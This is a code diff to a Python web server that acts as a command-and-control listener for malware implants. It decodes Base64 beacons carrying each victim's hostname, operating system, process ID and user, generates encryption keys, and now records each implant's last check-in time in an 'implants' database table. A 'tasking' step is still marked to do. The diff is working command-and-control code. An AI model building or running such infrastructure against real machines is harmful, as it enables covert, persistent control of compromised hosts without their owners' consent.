@@ -73,6 +73,10 @@ class WebServer(object):
         # gets raw POST data
         raw_data = request.get_data()
 
+        # gets current time (uses server's time)
+        now = datetime.datetime.now()
+        current_time = now.strftime("%Y-%m-%d %H:%M:%S")
+
         # if initial Base64 beacon
         # new beacon
         if self.is_base64(raw_data) is True:
@@ -85,10 +89,6 @@ class WebServer(object):
             operating_system = j["o"]
             process_id = j["p"]
             current_user = j["u"]
-
-            # gets current time (uses server's time)
-            now = datetime.datetime.now()
-            current_time = now.strftime("%Y-%m-%d %H:%M:%S")
 
             # generates a random 32 character encryption key
             # (upper and lower, no numbers)
@@ -130,13 +130,15 @@ class WebServer(object):
                         process_id = j["process_id"]
                         operating_system = j["operating_system"]
 
-                        # DEBUGGING
-                        print(hostname)
-                        print(current_user)
-                        print(process_id)
-                        print(operating_system)
-
-                        # TO DO: updates last_beacon time in "implants" table
+                        # updates "last_beacon" time in "implants" table
+                        with self.connection:
+                            cursor = self.connection.cursor()
+                            cursor.execute("""UPDATE implants SET last_beacon = ?
+                                              WHERE hostname = ?
+                                              AND process_id = ?""",
+                                           (current_time,
+                                            hostname,
+                                            process_id))
 
                         # TO DO: checks for tasking
 
